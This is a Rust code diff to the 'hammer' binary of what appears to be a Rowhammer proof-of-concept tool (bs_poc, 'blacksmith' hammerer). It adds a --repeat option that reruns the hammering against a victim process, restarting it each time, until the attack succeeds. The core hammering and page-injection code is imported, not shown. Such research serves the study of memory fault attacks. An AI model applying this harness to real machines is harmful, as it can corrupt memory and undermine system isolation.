@@ -2,7 +2,6 @@ use std::{
     fmt::Debug,
     fs::File,
     io::{stdin, BufReader},
-    process::{ChildStdin, ChildStdout},
 };
 
 use anyhow::bail;
@@ -13,7 +12,7 @@ use bs_poc::hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, Patt
 use bs_poc::hammerer::HammerResult;
 use bs_poc::hammerer::Hammering;
 use bs_poc::memory::mem_configuration::MemConfiguration;
-use bs_poc::victim::{process, HammerVictim};
+use bs_poc::victim::HammerVictim;
 use bs_poc::{
     allocator,
     allocator::{BuddyInfo, ConsecAlloc, ConsecAllocator, Mmap},
@@ -24,11 +23,11 @@ use bs_poc::{
 use bs_poc::{
     memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming, ConsecCheckNone, ConsecCheckPfn},
     retry,
-    util::{init_logging_with_progress, PipeIPC},
+    util::init_logging_with_progress,
 };
 use clap::Parser;
 use indicatif::MultiProgress;
-use log::{info, warn};
+use log::{error, info, warn};
 
 /// CLI arguments for the `hammer` binary.
 ///
@@ -59,6 +58,10 @@ struct CliArgs {
     /// The hammering strategy to use. The default is `blacksmith`.
     #[clap(long = "hammerer", default_value = "blacksmith")]
     hammerer: HammerStrategy,
+    /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
+    /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
+    #[arg(short, long)]
+    repeat: Option<Option<usize>>,
     /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
     target: Vec<String>,
 }
@@ -271,51 +274,53 @@ unsafe fn _main() -> anyhow::Result<()> {
             .create_allocator(consec_checker, mem_config, Some(progress.clone()));
     let block_size = alloc_strategy.block_size();
 
-    info!("Starting bait allocation");
-    let memory = allocator::alloc_memory(&mut alloc_strategy, mem_config, &pattern.mapping)?;
-    info!("Allocated {} bytes of memory", memory.len());
-
-    let mut victim = process::spawn_victim(&args.target)?;
-    process::log_victim_stderr(&mut victim)?;
-    let mut hammer_victim: Box<dyn HammerVictim> = match &mut victim {
-        Some(victim) => {
-            let mut pipe: PipeIPC<ChildStdout, ChildStdin> = process::piped_channel(victim)?;
-            process::inject_page(&mut pipe)?;
-            Box::new(victim::Process::new(pipe))
-        }
-        None => {
-            warn!(
-                "No target specified, falling back to mem check. Consider `./hammer --config [...] your_victim your_victim_args`"
-            );
-            Box::new(victim::MemCheck::new(mem_config, &memory))
-        }
+    let repetitions = match args.repeat {
+        Some(Some(repeat)) => repeat,
+        Some(None) => usize::MAX,
+        None => 1,
     };
 
-    let result = hammer(
-        &args.hammerer,
-        &pattern.pattern,
-        &pattern.mapping,
-        &mut *hammer_victim,
-        mem_config,
-        block_size,
-        &memory,
-    );
-    if let Some(victim) = victim {
-        info!("Waiting for victim to finish");
-        let output = victim.wait_with_output()?;
-        info!("Captured output: {:?}", output);
-    }
+    for _ in 0..repetitions {
+        info!("Starting bait allocation");
+        let memory = allocator::alloc_memory(&mut alloc_strategy, mem_config, &pattern.mapping)?;
+        info!("Allocated {} bytes of memory", memory.len());
 
-    match result {
-        Ok(res) => {
-            info!("{:?}", res);
-            hammer_victim.log_report();
-            Ok(())
+        let mut victim: Box<dyn HammerVictim> = if args.target.is_empty() {
+            warn!(
+            "No target specified, falling back to mem check. Consider `./hammer --config [...] your_victim your_victim_args`"
+            );
+            Box::new(victim::MemCheck::new(mem_config, &memory))
+        } else {
+            Box::new(victim::Process::new(&args.target)?)
+        };
+
+        let result = hammer(
+            &args.hammerer,
+            &pattern.pattern,
+            &pattern.mapping,
+            &mut *victim,
+            mem_config,
+            block_size,
+            &memory,
+        );
+
+        match result {
+            Ok(res) => {
+                info!("{:?}", res);
+                victim.log_report();
+                return Ok(());
+            }
+            Err(e) => {
+                error!("Hammering not successful: {:?}", e)
+            }
         }
-        Err(e) => {
-            bail!("Hammering not successful: {:?}", e)
-        }
+        drop(victim);
+        memory.dealloc();
     }
+    bail!(
+        "Hammering was not successful after {} repetitions",
+        repetitions
+    );
 }
 
 fn main() -> anyhow::Result<()> {
